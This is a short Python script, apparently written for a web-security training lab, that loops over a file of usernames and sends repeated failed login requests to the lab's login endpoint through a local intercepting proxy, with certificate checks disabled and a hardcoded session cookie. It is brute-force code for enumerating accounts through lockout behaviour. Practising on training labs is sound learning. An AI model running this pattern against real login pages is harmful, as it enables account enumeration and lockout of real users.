import sys
import requests
import urllib3
import urllib

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)



proxy = {'https': 'https://127.0.0.1:8080'}




def main():
    cookies = {'session':'uM8ML6v7p8QyUZC6pwPUt6ZcK5HSyZgt'}
    f = open("usernames.txt", "r")
    usernames = f.read().splitlines()
    for user in usernames:
      for i in range(1, 6): 
        print(user)
        r = requests.post('https://ac7d1f6b1fa5cf6880ebb59300c90011.web-security-academy.net/login', cookies=cookies, data = {'username': user, 'password':'masterasdasdasdasdsadas'}, verify=False, proxies=proxy)
    #get_password(url)
    



if __name__ == "__main__":
    main()